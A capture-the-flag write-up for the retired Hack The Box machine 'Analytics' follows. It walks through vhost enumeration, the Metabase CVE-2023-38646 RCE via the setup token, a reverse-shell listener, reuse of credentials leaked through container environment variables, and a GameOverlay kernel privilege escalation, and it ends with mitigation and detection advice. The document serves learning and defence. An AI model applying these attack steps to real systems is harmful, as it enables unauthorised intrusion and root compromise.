---
machine: Analytics
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, metabase, cve-2023-38646, docker, overlayfs]
---

# Analytics — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Metabase 0.46.6 on `data.analytical.htb` is vulnerable to CVE-2023-38646 (pre-auth RCE). The shell lands in a Docker container; environment variables leak host SSH credentials. On the host, kernel 6.2.0-25 is vulnerable to GameOverlay (CVE-2023-2640 + CVE-2023-32629), yielding root.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80 <IP>
```

Port 80 redirects to `analytical.htb`. Add it to hosts and enumerate vhosts:

```bash
ffuf -u http://analytical.htb -H 'Host: FUZZ.analytical.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

`data.analytical.htb` appears, hosting Metabase.

## Initial access

Identify the version in `/app/dist/app-main.js` or the HTML. Metabase 0.46.6 is vulnerable to CVE-2023-38646:

```bash
curl -s http://data.analytical.htb/api/session/properties | jq .'setup-token'
```

With the setup token, send a payload to `/api/setup/validate`. The `details.db` field accepts a `connection_uri` with the H2 driver and `INIT=RUNSCRIPT FROM ...`, executing commands inside the container. Serve the script locally and catch the reverse shell.

```bash
python3 -m http.server 8000
nc -lvnp 4444
```

## From container to host

```bash
id
hostname
env
```

The container exposes environment variables with database and host-user credentials. Reuse them over SSH:

```bash
ssh <USER>@<IP>
```

## Privilege escalation

```bash
uname -a
# 6.2.0-25-generic
```

The kernel is vulnerable to GameOverlay. Build or fetch a CVE-2023-2640/CVE-2023-32629 exploit and run it in a user namespace:

```bash
unshare -rm sh -c 'mkdir -p l u w m && ...'
```

The `setuid(0)` binary returns a root shell. Read and redact the flag.

## Evidence

- `api/session/properties` response with the setup token redacted.
- `api/setup/validate` request and container shell.
- `uname -a`, `env` and overlayfs exploit execution.

## Lessons learned

- A forgotten vhost can expose a vulnerable instance.
- Metabase's setup token is sensitive even before login.
- Container environment variables often hold host credentials.
- GameOverlay affects Ubuntu kernels with an incomplete OverlayFS patch.

## Mitigation and detection

- Update Metabase and restrict `/api/setup`.
- Do not run containers with host credentials in environment variables.
- Patch kernels and limit user namespaces.
- Detect requests to `api/setup/validate` with `connection_uri` and unusual H2 processes.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2023-38646>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-2640>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-32629>
- <https://www.hackthebox.com/machines/analytics>
